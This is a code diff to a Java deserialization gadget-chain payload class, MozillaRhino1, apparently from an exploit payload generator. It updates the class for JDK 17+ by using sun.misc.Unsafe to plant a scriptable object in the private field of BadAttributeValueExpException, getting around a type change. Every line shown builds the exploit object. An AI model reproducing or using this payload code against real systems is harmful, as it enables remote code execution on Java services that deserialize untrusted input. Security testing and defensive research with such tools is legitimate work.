@@ -15,6 +15,8 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
+import sun.misc.Unsafe;
+
 /*
     by @matthias_kaiser
 */
@@ -59,9 +61,12 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
         idScriptableObject.setPrototype(nativeObject);
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
-        Reflections.setAccessible(valField);
-        valField.set(badAttributeValueExpException, idScriptableObject);
+        // JDK 17+ changed val field type from Object to String — use Unsafe to bypass
+        final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
+        unsafeField.setAccessible(true);
+        final Unsafe unsafe = (Unsafe) unsafeField.get(null);
+        final Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
+        unsafe.putObject(badAttributeValueExpException, unsafe.objectFieldOffset(valField), idScriptableObject);
 
         return badAttributeValueExpException;
     }
